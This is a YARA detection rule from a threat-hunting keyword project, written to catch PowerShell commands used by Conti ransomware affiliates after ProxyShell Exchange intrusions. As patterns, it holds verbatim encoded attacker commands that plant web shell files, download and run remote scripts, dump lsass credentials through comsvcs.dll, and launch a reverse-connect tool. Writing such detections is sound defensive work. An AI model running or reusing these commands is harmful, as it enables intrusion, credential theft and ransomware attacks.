rule Conti_Ranwomware
{
    meta:
        description = "Detection patterns for the tool 'Conti Ranwomware' taken from the ThreatHunting-Keywords github project" 
        author = "@mthcht"
        reference = "https://github.com/mthcht/ThreatHunting-Keywords"
        tool = "Conti Ranwomware"
        rule_category = "offensive_tool_keyword"

    strings:
        // Description: Conti Ransomware Proxyshell PowerShell command #5
        // Reference: https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/
        $string1 = "powershell -enc cwBjACAALQBwAGEAdABoACAAIgBjADoAXABwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXABhAC4AdAB4AHQAIgAgAC0AdgBhAGwAdQBlACAAJABhACAALQBGAG8AcgBjAGUAOwBzAGMAIAAtAHAAYQB0AGgAIABjADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAGEAcwBwAG4AZQB0AF8AYwBsAGkAZQBuAHQAXAB0AGUAcwB0AC4AdAB4AHQAIAAtAHYAYQBsAHUAZQAgACgAaQBlAHgAKAAnAG4AbAB0AGUAcwB0ACAALwBkAGMAbABpAHMAdAA6ACcAKQB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA=" nocase ascii wide
        // Description: Conti Ransomware Proxyshell PowerShell command #5
        // Reference: https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/
        $string2 = "powershell -enc cwBjACAALQBwAGEAdABoACAAIgBjADoAXABwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXABhAC4AdAB4AHQAIgAgAC0AdgBhAGwAdQBlACAAJABhACAALQBGAG8AcgBjAGUAOwBzAGMAIAAtAHAAYQB0AGgAIABjADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAGEAcwBwAG4AZQB0AF8AYwBsAGkAZQBuAHQAXAB0AGUAcwB0AC4AdAB4AHQAIAAtAHYAYQBsAHUAZQAgACgAaQBlAHgAKAAnAG4AZQB0ACAAZwByAG8AdQBwACAAIgBkAG8AbQBhAGkAbgAgAGMAbwBtAHAAdQB0AGUAcgBzACIAIAAvAGQAbwBtAGEAaQBuACcAKQB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA=" nocase ascii wide
        // Description: Conti Ransomware Proxyshell PowerShell command #2
        // Reference: https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/
        $string3 = "powershell -enc cwBjACAALQBwAGEAdABoACAAYwA6AFwAaQBuAGUAdABwAHUAYgBcAHcAdwB3AHIAbwBvAHQAXABhAHMAcABuAGUAdABfAGMAbABpAGUAbgB0AFwAdABlAHMAdAAuAHQAeAB0ACAALQB2AGEAbAB1AGUAIAAoAGkAZQB4ACgAJwBsAHMAIABjADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAGEAcwBwAG4AZQB0AF8AYwBsAGkAZQBuAHQAXAAnACkAfABPAHUAdAAtAFMAdAByAGkAbgBnACkA" nocase ascii wide
        // Description: Conti Ransomware Proxyshell PowerShell command #6
        // Reference: https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/
        $string4 = "powershell -enc cwBjACAALQBwAGEAdABoACAAYwA6AFwAaQBuAGUAdABwAHUAYgBcAHcAdwB3AHIAbwBvAHQAXABhAHMAcABuAGUAdABfAGMAbABpAGUAbgB0AFwAdABlAHMAdAAuAHQAeAB0ACAALQB2AGEAbAB1AGUAIAB0AGUAcwBlAHQA" nocase ascii wide
        // Description: Conti Ransomware Proxyshell PowerShell command #1
        // Reference: https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/
        $string5 = "powershell -enc dwBoAG8AYQBtAGkA" nocase ascii wide
        // Description: Conti Ransomware Proxyshell PowerShell command #3
        // Reference: https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/
        $string6 = "powershell -enc JABhAD0AIgBQAEMAVgBBAEkARgBCAGgAWgAyAFUAZwBUAEcARgB1AFoAMwBWAGgAWgAyAFUAOQBJAGsATQBqAEkAaQBCAEUAWgBXAEoAMQBaAHoAMABpAGQASABKADEAWgBTAEkAZwBkAG0ARgBzAGEAVwBSAGgAZABHAFYAUwBaAFgARgAxAFoAWABOADAAUABTAEoAbQBZAFcAeAB6AFoAUwBJAGcASgBUADQATgBDAGoAdwBsAFEAQwBCAEoAYgBYAEIAdgBjAG4AUQBnAFQAbQBGAHQAWgBYAE4AdwBZAFcATgBsAFAAUwBKAFQAZQBYAE4AMABaAFcAMAB1AFIARwBsAGgAWgAyADUAdgBjADMAUgBwAFkAMwBNAGkASQBDAFUAKwBEAFEAbwA4AEoAVQBBAGcAUwBXADEAdwBiADMASgAwAEkARQA1AGgAYgBXAFYAegBjAEcARgBqAFoAVAAwAGkAVQAzAGwAegBkAEcAVgB0AEwAawBsAFAASQBpAEEAbABQAGcAMABLAFAAQwBWAEEASQBFAGwAdABjAEcAOQB5AGQAQwBCAE8AWQBXADEAbABjADMAQgBoAFkAMgBVADkASQBsAE4ANQBjADMAUgBsAGIAUwBJAGcASgBUADQATgBDAGoAdwBsAFEAQwBCAEoAYgBYAEIAdgBjAG4AUQBnAFQAbQBGAHQAWgBYAE4AdwBZAFcATgBsAFAAUwBKAFQAZQBYAE4AMABaAFcAMAB1AFUAbgBWAHUAZABHAGwAdABaAFMANQBUAFoAWABKAHAAWQBXAHgAcABlAG0ARgAwAGEAVwA5AHUATABrAFoAdgBjAG0AMQBoAGQASABSAGwAYwBuAE0AdQBRAG0AbAB1AFkAWABKADUASQBpAEEAbABQAGcAMABLAFAASABOAGoAYwBtAGwAdwBkAEMAQgB5AGQAVwA1AGgAZABEADAAaQBjADIAVgB5AGQAbQBWAHkASQBqADQATgBDAG4AQgB5AGIAMwBSAGwAWQAzAFIAbABaAEMAQgB6AGQASABKAHAAYgBtAGMAZwBSAFgAaABqAGEARwBGAHUAWgAyAFYAUwBkAFcANQAwAGEAVwAxAGwASwBDAGsATgBDAG4AcwBOAEMAZwBsAHkAWgBYAFIAMQBjAG0ANABnAGMAeQA1AFUAWgBYAGgAMABMAGwAUgB2AFUAMwBSAHkAYQBXADUAbgBLAEMAawA3AEQAUQBwADkARABRAHAAdwBjAG0AOQAwAFoAVwBOADAAWgBXAFEAZwBkAG0AOQBwAFoAQwBCAEUAWQBYAFIAaABZAG0ARgB6AFoAUwBoAE4AWgBXADEAdgBjAG4AbABUAGQASABKAGwAWQBXADAAZwBiAFMAeABDAGEAVwA1AGgAYwBuAGwARwBiADMASgB0AFkAWABSADAAWgBYAEkAZwBZAGkAawBOAEMAbgBzAE4AQwBnAGsASgBiAFMANQBRAGIAMwBOAHAAZABHAGwAdgBiAGkAQQA5AEkARABBADcARABRAG8ASgBDAFcASQB1AFIARwBWAHoAWgBYAEoAcABZAFcAeABwAGUAbQBVAG8AYgBTAGsANwBEAFEAcAA5AEQAUQBwAHcAYwBtADkAMABaAFcATgAwAFoAVwBRAGcAZABtADkAcABaAEMAQgBEAFgAMABOAHMAYQBXAE4AcgBLAEcAOQBpAGEAbQBWAGoAZABDAEIAegBaAFcANQBrAFoAWABJAHMASQBFAFYAMgBaAFcANQAwAFEAWABKAG4AYwB5AEIAbABLAFEAMABLAGUAdwAwAEsAQwBRAGwAQwBlAFgAUgBsAFcAMQAwAGcAVQB5AEEAOQBJAEYATgA1AGMAMwBSAGwAYgBTADUARABiADIANQAyAFoAWABKADAATABrAFoAeQBiADIAMQBDAFkAWABOAGwATgBqAFIAVABkAEgASgBwAGIAbQBjAG8AUgBYAGgAagBhAEcARgB1AFoAMgBWAFMAZABXADUAMABhAFcAMQBsAEsAQwBrAHAATwB3ADAASwBDAFEAbABOAFoAVwAxAHYAYwBuAGwAVABkAEgASgBsAFkAVwAwAGcAYgBTAEEAOQBJAEcANQBsAGQAeQBCAE4AWgBXADEAdgBjAG4AbABUAGQASABKAGwAWQBXADAAbwBVAHkAawA3AEQAUQBvAEoAQwBVAEoAcABiAG0ARgB5AGUAVQBaAHYAYwBtADEAaABkAEgAUgBsAGMAaQBCAGkASQBEADAAZwBiAG0AVgAzAEkARQBKAHAAYgBtAEYAeQBlAFUAWgB2AGMAbQAxAGgAZABIAFIAbABjAGkAZwBwAE8AdwAwAEsAQwBRAGwARQBZAFgAUgBoAFkAbQBGAHoAWgBTAGgAdABMAEcASQBwAE8AdwAwAEsARABRAHAAOQBEAFEAbwA4AEwAMwBOAGoAYwBtAGwAdwBkAEQANABOAEMAagB4AG8AZABHADEAcwBQAGcAMABLAFAARwBaAHYAYwBtADAAZwBhAFcAUQA5AEkAbQBaAHYAYwBtADAAaQBJAEgASgAxAGIAbQBGADAAUABTAEoAegBaAFgASgAyAFoAWABJAGkASQBEADQATgBDAGoAeABoAGMAMwBBADYAVgBHAFYANABkAEUASgB2AGUAQwBCAHkAZABXADUAaABkAEQAMABpAGMAMgBWAHkAZABtAFYAeQBJAGkAQgBKAFIARAAwAGkAYwB5AEkAZwBWAG0ARgBzAGQAVwBVADkASQBpAEkAZwBhAFcANQB3AGQAWABRAGcAYwAzAFIANQBiAEcAVQA5AEkAbQBKAHYAYwBtAFIAbABjAGoAbwB3AGMASABnAGkATAB6ADQATgBDAGoAeABoAGMAMwBBADYAUQBuAFYAMABkAEcAOQB1AEkARQBsAEUAUABTAEoARABJAGkAQgB5AGQAVwA1AGgAZABEADAAaQBjADIAVgB5AGQAbQBWAHkASQBpAEIAVQBaAFgAaAAwAFAAUwBJAGkASQBFADkAdQBRADIAeABwAFkAMgBzADkASQBrAE4AZgBRADIAeABwAFkAMgBzAGkASQBDADgAKwBEAFEAbwA4AEwAMgBaAHYAYwBtADAAKwBEAFEAbwA4AEwAMgBKAHYAWgBIAGsAKwBEAFEAbwA4AEwAMgBoADAAYgBXAHcAKwAiADsAJABhAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABhACkAKQA7AHMAYwAgAC0AcABhAHQAaAAgACIAYwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAYQAuAHQAeAB0ACIAIAAtAHYAYQBsAHUAZQAgACQAYQAgAC0ARgBvAHIAYwBlADsAcwBjACAALQBwAGEAdABoACAAYwA6AFwAaQBuAGUAdABwAHUAYgBcAHcAdwB3AHIAbwBvAHQAXABhAHMAcABuAGUAdABfAGMAbABpAGUAbgB0AFwAdABlAHMAdAAuAHQAeAB0ACAALQB2AGEAbAB1AGUAIAAoAGkAZQB4ACgAJwBsAHMAIABjADoAXABwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXAAnACkAfABPAHUAdAAtAFMAdAByAGkAbgBnACkA" nocase ascii wide
        // Description: Conti Ransomware Proxyshell PowerShell command #4
        // Reference: https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/
        $string7 = "powershell -enc QwBvAHAAeQAtAEkAdABlAG0AIAAtAHAAYQB0AGgAIABjADoAXABwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXABhAC4AdAB4AHQAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwARQB4AGMAaABhAG4AZwBlACAAUwBlAHIAdgBlAHIAXABWADEANQBcAEYAcgBvAG4AdABFAG4AZABcAEgAdAB0AHAAUAByAG8AeAB5AFwAbwB3AGEAXABhAHUAdABoAFwAYwB1AHIAcgBlAG4AdABcAHQAaABlAG0AZQBzAFwAUgBlAHMAbwB1AHIAYwBlAEgAYQBuAGQAbABlAHIALgBhAHMAcAB4ACIAIAAtAEYAbwByAGMAZQA7AHMAYwAgAC0AcABhAHQAaAAgAGMAOgBcAGkAbgBlAHQAcAB1AGIAXAB3AHcAdwByAG8AbwB0AFwAYQBzAHAAbgBlAHQAXwBjAGwAaQBlAG4AdABcAHQAZQBzAHQALgB0AHgAdAAgAC0AdgBhAGwAdQBlACAAKABpAGUAeAAoACcAbABzACAAIgBDADoAXABQAHIAbwBnAHIAYQBtACAARgBpAGwAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABFAHgAYwBoAGEAbgBnAGUAIABTAGUAcgB2AGUAcgBcAFYAMQA1AFwARgByAG8AbgB0AEUAbgBkAFwASAB0AHQAcABQAHIAbwB4AHkAXABvAHcAYQBcAGEAdQB0AGgAXABjAHUAcgByAGUAbgB0AFwAdABoAGUAbQBlAHMAXAAiACcAKQB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA=" nocase ascii wide
        // Description: Conti Ransomware Proxyshell PowerShell command #14
        // Reference: https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/
        $string8 = "powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAyADAANAAxADIALwAnACkAOwAgAC4AXAByAGMAbABvAG4AZQBtAGEAbgBhAGcAZQByAC4AcABzADEA" nocase ascii wide
        // Description: Conti Ransomware Proxyshell PowerShell command #8
        // Reference: https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/
        $string9 = /powershell\.exe\s\-noninteractive\s\-executionpolicy\sbypass\sipconfig\s\/all/ nocase ascii wide
        // Description: Conti Ransomware Proxyshell PowerShell command #11
        // Reference: https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/
        $string10 = /powershell\.exe\s\-noninteractive\s\-executionpolicy\sbypass\sps\slsass/ nocase ascii wide
        // Description: Conti Ransomware Proxyshell PowerShell command #10
        // Reference: https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/
        $string11 = /powershell\.exe\s\-noninteractive\s\-executionpolicy\sbypass\squser/ nocase ascii wide
        // Description: Conti Ransomware Proxyshell PowerShell command #13
        // Reference: https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/
        $string12 = /powershell\.exe\s\-noninteractive\s\-executionpolicy\sbypass\srundll32\.exe\sC\:\\windows\\System32\\comsvcs\.dll.{0,100}\sMiniDump\s.{0,100}\sC\:\\programdata\\a\.zip\sfull/ nocase ascii wide
        // Description: Conti Ransomware Proxyshell PowerShell command #12
        // Reference: https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/
        $string13 = /powershell\.exe\s\-noninteractive\s\-executionpolicy\sbypass\sStart\-Process\sc\:\\windows\\SVN\.exe\s\-ArgumentList\s.{0,100}\-connect\s.{0,100}\s\-pass\sPassword1234/ nocase ascii wide
        // Description: Conti Ransomware Proxyshell PowerShell command #7
        // Reference: https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/
        $string14 = /sc\s\-path\sc\:\\inetpub\\wwwroot\\aspnet_client\\test\.txt\s\-value\steset/ nocase ascii wide
        $metadata_regex_import = /\bimport\s+[a-zA-Z0-9_.]+\b/ nocase
        $metadata_regex_function = /function\s+[a-zA-Z_][a-zA-Z0-9_]*\(/ nocase ascii
        $metadata_regex_php = /<\?php/ nocase ascii
        $metadata_regex_createobject = /(CreateObject|WScript\.)/ nocase ascii
        $metadata_regex_script = /<script\b/ nocase ascii
        $metadata_regex_javascript = /(let\s|const\s|function\s|document\.|console\.)/ nocase ascii
        $metadata_regex_powershell = /(Write-Host|Get-[a-zA-Z]+|Invoke-|param\(|\.SYNOPSIS)/ nocase ascii
        $metadata_regex_batch = /@(echo\s|call\s|set\s|goto\s|if\s|for\s|rem\s)/ nocase ascii
        $metadata_regex_shebang = /^#!\// nocase ascii

    condition:
        ((filesize < 20MB and (
            uint16(0) == 0x5a4d or // Windows binary
            uint16(0) == 0x457f or // Linux ELF
            uint32be(0) == 0x7f454c46 or uint16(0) == 0xfeca or uint16(0) == 0xfacf or uint32(0) == 0xbebafeca or // macOS binary
            uint32(0) == 0x504B0304 or // Android APK, JAR
            uint32(0) == 0xCAFEBABE or // Java Class, Mach-O Universal Binary
            uint32(0) == 0x4D534346 or // Windows Cabinet File
            uint32(0) == 0xD0CF11E0 or // MSI Installer Package
            uint16(0) == 0x2321 or // Shebang (#!)
            uint16(0) == 0x3c3f // PHP and other script
        )) and any of ($string*)) or
        (filesize < 2MB and
        (
            any of ($string*) and
            for any of ($metadata_regex_*) : ( @ <= 20000 )
        ))
}
